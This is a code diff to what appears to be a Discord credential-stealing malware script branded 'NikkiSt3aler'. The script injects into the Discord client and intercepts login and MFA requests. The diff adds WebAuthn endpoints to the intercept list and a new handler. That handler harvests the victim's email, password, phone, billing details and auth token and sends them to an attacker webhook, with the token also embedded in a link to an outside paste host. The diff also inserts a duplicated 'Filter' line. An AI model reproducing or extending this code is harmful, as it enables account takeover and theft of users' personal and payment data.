@@ -22,6 +22,7 @@ var config = {
   "embed-color": 2895667,
   "disable_qrcode": "%DISABLE_QRCODE%",
   Filter: {
+  Filter: {
         urls: [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
             "https://*.discord.com/api/v*/applications/detectable",
@@ -45,7 +46,10 @@ var config = {
             "https://discord.com/api/v*/auth/mfa/totp",
             "https://discordapp.com/api/v*/auth/mfa/totp",
             "https://*.discord.com/api/v*/auth/mfa/totp",
-            "https://discord.com/api/v*/users/@me/mfa/totp/enable"
+            "https://discord.com/api/v*/users/@me/mfa/totp/enable",
+            "https://discord.com/api/v9/auth/mfa/webauthn",
+            "https://*.discord.com/api/v9/auth/mfa/webauthn",
+            "https://discordapp.com/api/v9/auth/mfa/webauthn"
         ]
     },
 }
@@ -541,6 +545,86 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
       await sendWebhook(webhook, dataLogin3);
 
+      break
+
+    case request.url.endsWith("webauthn"):
+      const passwddddd = contents2FA[0].passwd
+
+      const embedLogin4 = {
+        title: "Login Detected - NikkiSt3aler",
+        color: 0x530000,
+        fields: [
+          {
+            name: "Username:",
+            value: "`"+user.username+"`",
+            inline: true
+          },
+          {
+            name: "ID:",
+            value: "`"+user.id+"`",
+            inline: true
+          },
+          {
+            name: "Nitro:",
+            value: `${GetNitro(Nitro)}`,
+            inline: true
+          },
+          {
+            name: "Email:",
+            value: "`"+user.email+"`",
+            inline: true
+          },
+          {
+            name: "Password:",
+            value: "`"+passwddddd+"`",
+            inline: true
+          },
+          {
+            name: "Phone:",
+            value: "`"+user.phone+"`",
+            inline: true
+          },
+          {
+            name: "Billing:",
+            value: Billings,
+            inline: true
+          },
+          {
+            name: "MFA:",
+            value: GetA2F(user.mfa_enabled),
+            inline: true
+          },
+          {
+            name: "Badges:",
+            value: `${GetBadges(user.flags)}`,
+            inline: true
+          },
+          {
+            name: "Token:",
+            value: "||"+token+"||\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
+            inline: false
+          },
+        ],
+        author: {
+          name: user.username+"#0000 - NikkiSt3aler",
+          icon_url: userAvatar
+        },
+        footer: {
+          icon_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a",
+          text: "nikkistealer by sk4yx"
+        },
+        timestamp: dataNow,
+      }
+
+      contents2FA.splice(0, contents2FA.length);
+
+      const dataLogin4 = {
+        embeds: [embedLogin4],
+        username: "Logins - NikkiSt2aler",
+        avatar_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a"
+      }
+
+      await sendWebhook(webhook, dataLogin4);
       break
 
     case request.url.endsWith("tokens"):
